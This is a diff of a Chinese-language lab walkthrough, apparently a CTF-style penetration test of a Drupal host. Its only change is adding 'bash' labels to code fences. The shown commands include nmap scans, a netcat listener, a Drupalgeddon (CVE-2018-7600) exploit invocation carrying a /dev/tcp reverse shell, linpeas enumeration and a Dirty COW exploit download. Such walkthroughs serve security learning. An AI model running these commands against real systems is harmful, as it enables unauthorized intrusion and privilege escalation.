@@ -22,7 +22,7 @@ tags:
 
 使用 nmap 进行主机发现
 
-```
+```bash
 sudo nmap -sn 10.10.10.0/24
 ```
 
@@ -30,7 +30,7 @@ sudo nmap -sn 10.10.10.0/24
 
 10.10.10.44 是新发现的主机，为靶机 IP；使用 nmap 以最低 10000 的速率进行全端口扫描
 
-```
+```bash
 sudo nmap --min-rate 10000 -p- 10.10.10.44
 ```
 
@@ -38,7 +38,7 @@ sudo nmap --min-rate 10000 -p- 10.10.10.44
 
 一共开放了三个 tcp 端口，使用 nmap 进行详细的端口扫描
 
-```
+```bash
 sudo nmap -sT -sC -sV -p22,80,1839 10.10.10.44
 ```
 
@@ -46,7 +46,7 @@ sudo nmap -sT -sC -sV -p22,80,1839 10.10.10.44
 
 可以看到靶机开放 22 端口的 ssh 服务，一般 ssh 服务的渗透优先级靠后；80 端口是一个 http 服务，扫描出来的字符看上去并没有更多信息；1898 端口是一个 Apache 的 http 服务；使用 nmap 进行默认脚本扫描
 
-```
+```bash
 sudo nmap --script=vuln -p22,80,1898 10.10.10.44
 ```
 
@@ -75,11 +75,11 @@ github 上找到一个 CVE 利用，下载下来根据提示使用
 
 在 kali 本地建立一个监听，使用脚本连接到 kali
 
-```
+```bash
 sudo nc -lvnp 4444
 ```
 
-```
+```bash
 python3 drupa7-CVE-2018-7600.py http://10.10.10.44:1898/ -c 'bash -c "/bin/bash -i >& /dev/tcp/10.10.10.5/4444 0>&1"'
 ```
 
@@ -89,11 +89,11 @@ python3 drupa7-CVE-2018-7600.py http://10.10.10.44:1898/ -c 'bash -c "/bin/bash 
 
 在 tmp 目录下下载 linpeas 进行自动化枚举
 
-```
+```bash
 chmod +x linpeas.sh
 ```
 
-```
+```bash
 ./linpeas.sh
 ```
 
@@ -105,11 +105,11 @@ chmod +x linpeas.sh
 
 使用 searchsploit 搜索并下载 dirty cow 利用脚本
 
-```
+```bash
 searchsploit dirty cow
 ```
 
-```
+```bash
 searchsploit -m 40847
 ```
 
